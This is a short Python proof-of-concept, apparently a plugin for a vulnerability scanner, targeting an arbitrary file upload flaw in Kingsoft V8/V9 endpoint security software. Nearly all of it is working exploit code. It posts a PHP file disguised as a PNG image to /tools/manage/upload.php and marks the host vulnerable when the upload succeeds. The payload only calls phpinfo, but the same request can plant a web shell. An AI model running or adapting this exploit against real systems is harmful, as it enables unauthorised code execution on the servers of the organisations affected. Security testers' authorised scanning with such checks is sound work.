#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '金山 V8 V9 终端安全系统 文件上传',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/tools/manage/upload.php'
  data = '''------WebKitFormBoundaryhQcaKJIKAnejKGru
Content-Disposition: form-data; name="file";filename="21232f297a57a5a743894a0e4a801f13.php"
Content-Type: image/png

<?php phpinfo();?>
------WebKitFormBoundaryhQcaKJIKAnejKGru--'''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and "File is valid, and was successfully uploaded" in res.text:
      ret['huixian'] = '验证地址需要拼接[name]后面的php链接：\n'+res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret